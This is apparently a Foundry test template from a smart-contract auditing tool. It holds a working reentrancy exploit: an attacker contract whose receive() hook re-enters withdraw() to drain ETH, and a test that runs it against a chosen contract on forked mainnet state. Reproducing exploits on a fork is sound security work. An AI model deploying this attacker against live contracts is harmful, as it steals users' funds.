// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Classic ETH reentrancy drain
/// @notice Detector: reentrancy. Target calls the attacker (or sends ETH)
///         BEFORE updating the attacker's balance, so the attacker
///         re-enters withdraw() and drains more than they deposited.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Adapt IVictim to the target's real ABI.
///      Passing = exploit reproduced on fork state.
///      Failing = did NOT reproduce (guarded, or wrong interface).

interface IVictim {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVictim public immutable victim;
    uint256 public reentries;
    uint256 public maxReentries;

    constructor(address victim_) {
        victim = IVictim(victim_);
    }

    function attack(uint256 maxReentries_) external payable {
        maxReentries = maxReentries_;
        victim.deposit{value: msg.value}();
        victim.withdraw();
    }

    receive() external payable {
        if (reentries < maxReentries && address(victim).balance >= 1 wei) {
            reentries++;
            victim.withdraw();
        }
    }
}

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 10 ether);

        ReentrancyAttacker attacker = new ReentrancyAttacker(target);
        uint256 targetBefore = target.balance;
        uint256 attackerContractBefore = address(attacker).balance;

        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}(3);

        uint256 drained = targetBefore > target.balance ? targetBefore - target.balance : 0;
        console.log("drained:", drained);
        console.log("attacker reentries:", attacker.reentries());

        // Draining MORE than the 1 ether deposit proves the reentrancy.
        assertGt(drained, 1 ether, "exploit did not reproduce: drained <= deposit");
        assertGt(
            address(attacker).balance,
            attackerContractBefore + 1 ether,
            "attacker contract did not profit beyond its deposit"
        );
    }
}
